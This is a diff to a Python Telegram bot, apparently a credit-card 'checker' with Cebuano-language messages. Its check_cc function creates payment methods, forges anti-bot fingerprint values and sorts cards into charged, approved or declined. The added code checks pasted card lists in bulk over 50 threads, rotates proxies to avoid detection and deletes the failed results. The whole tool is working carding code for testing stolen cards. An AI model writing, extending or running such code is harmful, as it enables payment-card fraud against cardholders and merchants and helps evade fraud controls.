@@ -11,6 +11,7 @@ import string
 import urllib.parse
 from telebot import TeleBot, types
 from functools import partial
+
 if sys.platform == 'win32':
     os.system('chcp 65001 > nul')
 
@@ -236,7 +237,7 @@ def check_cc(cc_full, proxy=None, proxy_type="http"):
         if not pm_id:
             return "ERROR", "Failed to create PaymentMethod", "UNKNOWN"
         init_checksum = _rand_id(32)
-        js_checksum = "".join(random.choices(string.ascii_letters + string.digits + "\~^=[]|%#{}<>?`", k=50))
+        js_checksum = "".join(random.choices(string.ascii_letters + string.digits + "~^=[]|%#{}<>?`", k=50))
         pxvid = str(uuid.uuid4())
         rv_timestamp = "".join(random.choices(string.ascii_letters + string.digits + "&%=<>^`[];", k=120))
         confirm_form = {
@@ -426,3 +427,45 @@ def mass_check_paste(msg):
     ccs = lines
     if not ccs:
         bot.send_message(msg.chat.id, "Walay valid nga cards.")
+        return
+    bot.send_message(msg.chat.id, f"Nakarga {len(ccs)} ka cards.\n1 HTTP\n2 HTTPS\n3 SOCKS4\n4 SOCKS5\n5 PROXYLESS\n6 AUTO GOOD-PROXIES (VERY VERY FAST)")
+    bot.register_next_step_handler(msg, lambda m: mass_proxy_choice(m, ccs))
+
+def mass_proxy_choice(msg, ccs):
+    ch = msg.text.strip()
+    if ch == '6':
+        fetch_good_proxies(msg.chat.id)
+        start_mass_check(ccs, True, "http", msg.chat.id)
+    elif ch in ['1','2','3','4']:
+        bot.send_message(msg.chat.id, "I-paste ang proxies o `skip`:")
+        bot.register_next_step_handler(msg, lambda m: mass_proxy_paste(m, ccs, ch))
+    else:
+        start_mass_check(ccs, False, "http", msg.chat.id)
+
+def mass_proxy_paste(msg, ccs, p_type_idx):
+    txt = msg.text.strip()
+    if txt.lower() == 'skip':
+        start_mass_check(ccs, False, "http", msg.chat.id)
+        return
+    global proxies_list
+    proxies_list = [line.strip() for line in txt.splitlines() if line.strip()]
+    use = len(proxies_list) > 0
+    ptype = {'2':'https','3':'socks4','4':'socks5'}.get(p_type_idx, 'http')
+    bot.send_message(msg.chat.id, f"Nakarga {len(proxies_list)} proxies. Nagsugod na...")
+    start_mass_check(ccs, use, ptype, msg.chat.id)
+
+def start_mass_check(ccs, use_proxy, proxy_type, chat_id):
+    stats.update({"charged":0,"approved":0,"declined":0,"error":0})
+    bot.send_message(chat_id, f"🔄 Nagsugod sa {len(ccs)} ka cards... **VERY VERY FAST MODE (50 Threads)**")
+    worker_args = partial(worker, use_proxy=use_proxy, proxy_type=proxy_type, chat_id=chat_id)
+    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as ex:
+        ex.map(worker_args, ccs)
+    clean_declined_files()
+    bot.send_message(chat_id, f"""✅ **Human na ang Check!**
+Charged: {stats['charged']}
+Approved: {stats['approved']}
+Declined & Error: gidelete na""")
+
+if __name__ == "__main__":
+    print("HERMAN BISAK0L CHECKER - Running 24/7")
+    bot.infinity_polling(none_stop=True, interval=0, timeout=20)
